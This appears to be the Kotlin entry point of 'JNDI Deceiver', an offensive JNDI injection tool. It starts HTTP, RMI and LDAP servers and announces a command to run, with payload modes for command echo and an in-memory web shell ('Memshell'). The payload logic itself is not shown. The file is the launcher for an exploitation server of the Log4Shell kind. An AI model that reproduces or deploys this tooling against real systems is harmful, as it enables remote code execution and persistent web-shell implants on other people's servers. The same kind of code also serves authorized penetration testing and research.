import http.HTTPServer
import ldap.LDAPServer
import rmi.RMIServer
import util.Options
import util.green
import kotlin.concurrent.thread
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    Options.init(args)

    with(Options) {
        if (helpInfo) {
            println("undone")
            exitProcess(0)
        }
        println("""JNDI Deceiver
            |Address: $address
            |Command: $command
            |Payload: Echo -> $echo / Memshell -> $memshell
            |
        """.trimMargin().green())
    }

    // startup all servers
    thread { HTTPServer().run() }
    thread { RMIServer().run() }
    thread { LDAPServer().run() }
}
